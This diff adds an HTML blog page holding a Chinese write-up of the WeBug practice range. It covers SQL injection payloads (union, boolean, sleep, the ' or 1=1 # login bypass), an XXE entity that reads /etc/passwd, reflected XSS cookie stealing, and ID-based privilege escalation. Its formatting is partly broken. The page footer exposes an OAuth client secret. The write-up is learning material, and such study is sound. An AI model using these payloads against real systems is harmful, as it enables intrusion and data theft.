@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>WeBug-study - Cupid&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="a new ctfer&#39;s study">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
+  <meta name="description" content="WeBug靶场1.显错注入&amp;emsp;&amp;emsp;首先由于是本地搭建靶场，故无具体Url,这里用本地说明http://192.168.30.133/control/sqlinject/manifest_error.php?id=1，先试试加&amp;#39;。页面提示错误：Invalid query: SELECT * FROM sqlinjection WHERE id = ‘1’’。那么继续id=1’">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WeBug-study">
+<meta property="og:url" content="http://yoursite.com/2019/10/20/WeBug-study/index.html">
+<meta property="og:site_name" content="Cupid&#39;s Blog">
+<meta property="og:description" content="WeBug靶场1.显错注入&amp;emsp;&amp;emsp;首先由于是本地搭建靶场，故无具体Url,这里用本地说明http://192.168.30.133/control/sqlinject/manifest_error.php?id=1，先试试加&amp;#39;。页面提示错误：Invalid query: SELECT * FROM sqlinjection WHERE id = ‘1’’。那么继续id=1’">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-10-22T02:44:17.830Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WeBug-study">
+<meta name="twitter:description" content="WeBug靶场1.显错注入&amp;emsp;&amp;emsp;首先由于是本地搭建靶场，故无具体Url,这里用本地说明http://192.168.30.133/control/sqlinject/manifest_error.php?id=1，先试试加&amp;#39;。页面提示错误：Invalid query: SELECT * FROM sqlinjection WHERE id = ‘1’’。那么继续id=1’">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1577797660439">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Cupid">
+            <img src="/images/namei.png" alt="Cupid">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>61</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Social</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Cupid
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg">
+        
+        <h1>WeBug-study</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月20日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.4k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
+    
+    
+  </div>
+  <article>
+    <h1 id="WeBug靶场"><a href="#WeBug靶场" class="headerlink" title="WeBug靶场"></a>WeBug靶场</h1><p>1.显错注入<br>&emsp;&emsp;首先由于是本地搭建靶场，故无具体Url,这里用本地说明<a href="http://192.168.30.133/control/sqlinject/manifest_error.php?id=1，先试试加&#39;。页面提示错误：Invalid" target="_blank" rel="noopener">http://192.168.30.133/control/sqlinject/manifest_error.php?id=1，先试试加&#39;。页面提示错误：Invalid</a> query: SELECT * FROM sqlinjection WHERE id = ‘1’’。那么继续id=1’ order by 3#,页面报错。当order by 2时，页面正常，故字段数目为2.<br>接着直接爆库<a id="more"></a><br>payload:id=1’ union select 1,database() %23   database()=webug<br>爆表：<br>payload:id=1’ union select 1,table_name from information_schema.tables where table_schema=’webug’ %23<br>出现了：data_crudenv_listenv_pathflagsqlinjectionuseruser_test<br>这样看着好恼火，换一种方式查询：<br>爆表：<br>payload:id=1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’webug’ %23<br>这样就查出来：data_crud,env_list,env_path,flag,sqlinjection,user,user_test<br>因而可以知道group_concat可以将这些数据按照，分隔开。<br>接下来爆字段名：（爆flag表）<br>payload:id=1’ union select 1,group_concat(column_name) from information_schema.columns where  table_name = ‘flag’ and table_schema=’webug’ %23<br>获得字段：id,flag<br>最后获取字段内容：<br>payload:id=1’ union select 1,group_concat(flag) from flag %23<br>拿下flag.<br>2.布尔注入</p>
+<p>payload:id=1’ union select 1,group_concat(column_name) from information_schema.columns where  table_name = ‘env_list’ and table_schema=’webug’ %23<br>查出来了：id,envName,envDesc,envIntegration,delFlag,envFlag,level,type </p>
+<p>payload:id=1’ union select 1,group_concat(delFlag) from env_list %23,flag不在这里面。换个字段：envFlag<br>出来了：dfafdasfafdsadfa,fdsafsdfa,gfdgdfsdg,dsfasdczxcg,safsafasdfasdf<br>其中第一道题的flag也在里面，因而试试第二个。这道题感觉自己没有学到东西，因为它与第一道题在一个网页，因而，直接用第一题方法就能查出。故试试其他查询方法：<br>首先在查错时可以采用id=1’ or 1=1,<br>或id=1’ or 1=2构造这样的Bool型的语句，看他是否报错。<br>3.延迟注入<br>延迟注入寻找注入点采用sleep(),<br>进入页面后id=1’ and sleep(1) %23,可以发现页面有明显的延迟，故注入点肯定在此。<br>接下来尝试爆库：<br>payload:<br>4.万能密码登陆<br>由于这个很熟悉了，直接构造payload:’ or 1=1 #<br>然后密码随便输入就得到了flag.<br>温习一遍原理：检验的sql语句应当是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```$res = $dbConnect-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>因而在username框中输入了’ or 1=1 #<br>那么sql语句就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">很明显这是一个永真的句子，也就是密码随便输入，都可以查询出来是真的。因而也成为了万能密码。</span><br><span class="line">5.XXE注入</span><br><span class="line">进入页面后就是一个登陆，切只让输入用户名，用于本题说了XXE注入，故先学习下XXE,再用BP抓包构造XXE语句。</span><br><span class="line">## 什么是XXE ##</span><br><span class="line">&amp;emsp;&amp;emsp;简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</span><br><span class="line">当使用程序为PHP，则可以将libxml_disable_entity_loader设置为true来禁用外部实体，从而起到防御的目的。</span><br><span class="line">## 哪些Web应用存在XXE漏洞呢？ ##</span><br><span class="line">&amp;emsp;&amp;emsp;如果应用是通过用户上传处理XML文件或POST请求（例如将SAML用于单点登陆服务甚至是RSS）的，那么就很有可能受到XXE的攻击。XXE是一种非常漏洞。</span><br><span class="line">## 基本利用 ##</span><br><span class="line">&amp;emsp;&amp;emsp;通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换言之，XXE是一种从本地到达各种服务器的方法。其在一定程度上也可能帮助攻击这绕过防火墙规则过滤或身份验证检查。</span><br><span class="line"></span><br><span class="line">XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素</span><br><span class="line">```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;?&gt;--XML声明</span><br><span class="line">&lt;!DOCTYPE 文件名[</span><br><span class="line">&lt;!ENTITY实体名&quot;实体内容&quot;&gt;]&gt;--文档类型定义（DTD）</span><br><span class="line">&lt;元素名称 category=&quot;属性&quot;&gt;</span><br><span class="line">文本或其他元素</span><br><span class="line">&lt;/元素名称&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以下为一个简单的XML代码POST请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /vulerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9.*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">	&lt;core id=&quot;test&quot;&gt;</span><br><span class="line">	&lt;author&gt;John,Doe&lt;/author&gt;</span><br><span class="line">	&lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">	&lt;category&gt;Computer&lt;/category&gt;</span><br><span class="line">	&lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">&lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还可以包含恶意代码</p>
+<figure class="highlight plain"><figcaption><span>GVI [<!ENTITY xxe SYSTEM "file://etc/passwd">]>```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以上例子，服务器会给与响应，但大部分情况，不会向攻击者的浏览器或代理返回任何响应。这种情况，可以使用Blind XXE漏洞来构建。</span><br><span class="line">7.反射型XSS</span><br><span class="line">进入页面后，在http://192.168.30.133/control/xss/xss_1.php?id=&quot;在哪里可以注入呢&quot;，然后F12找到ID对应的位置，确认是否可以XSS。</span><br></pre></td></tr></table></figure>
+
+<script>alert(‘XSS’)</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后再使用这一句，让Id=它，测试XSS是否有效.发现页面直接弹窗，没有过滤任何限制，接着猜测flag在cookie中，于是构造：</span><br></pre></td></tr></table></figure>
+
+<script>(这句不要)alert('document.cookie')(这句不要)</script>```
+<p>拿下flag.<br>8.越权查看admin<br>进入页面后，首先输入我们的普通用户：aaaaa密码asdfsadf，然后进去后提示我是：aaaaa<br>可以看到Url上面id=2,那么极有可能数据都存储在一块的话，直接修改id=1,就越权看到了admin的内容：我是admin</p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>Author：</strong>Cupid<br>
+<strong>Link：</strong><a href="http://yoursite.com/2019/10/20/WeBug-study/" title="http://yoursite.com/2019/10/20/WeBug-study/" target="_blank" rel="noopener">http://yoursite.com/2019/10/20/WeBug-study/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1577797660484"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
